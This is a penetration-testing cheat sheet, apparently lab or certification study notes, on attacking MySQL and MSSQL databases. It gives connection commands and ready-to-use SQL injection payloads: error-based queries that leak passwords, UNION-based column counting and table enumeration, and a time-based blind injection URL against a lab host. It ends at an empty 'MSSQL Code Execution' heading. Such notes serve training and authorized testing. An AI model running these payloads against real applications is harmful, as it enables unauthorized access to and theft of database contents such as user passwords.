
##### Note: make sure to check for error messages.
#### Connecting to MySQL
```
mysql -h TARGET_IP -u USERNAME -p   // Remote authentication with username and password
```

```
SELECT @@VERSION;               // Print the SQL version
SELECT system_user();           // Print the current user. Note: this is the database-specific user, it may not be the user of the same name in the system.

SHOW databases;
USE DATABASE_NAME;
SHOW tables;
```


#### MSSQL basics
```
impacket-mssqlclient USER:PASSWORD@IP_ADDRESS -windows-auth
SELECT @@VERSION;

SELECT name FROM master.dbo.sysdatabases               // Show databases
SELECT * FROM TARGET_DB.information_schema.tables;     // Show tables


```


#### Enabled error messages
```
' or 1=1 in (select @@version) -- -                 
' or 1=1 in (SELECT password FROM users) -- -         // might show the passwords in the error message.
```


#### MySQL UNION injection
First, use these payloads ascending until an error occurs:
```
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```
The last number before the error is the amount of columns in the request. Then, use this payload with the appropriate amount of columns:
```
' UNION SELECT @@version -- -
' UNION SELECT null, @@version -- -
...
' UNION SELECT null, null, database(), user(), @@version  -- -
```
If the payload works, it's time to read the database tables:
```
' union select table_name from information_schema.columns where table_schema=database() -- -
' union select null, table_name from information_schema.columns where table_schema=database() -- -
...
' union select null, null, null, null, table_name from information_schema.columns where table_schema=database() -- -
// options: table_name, column_name, table_schema,
```

If a table is found:
```
' UNION SELECT null, COLUMN_NAME FROM TABLE_NAME -- 
```

#### Blind SQLI
```
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- -
```




#### MSSQL Code Execution
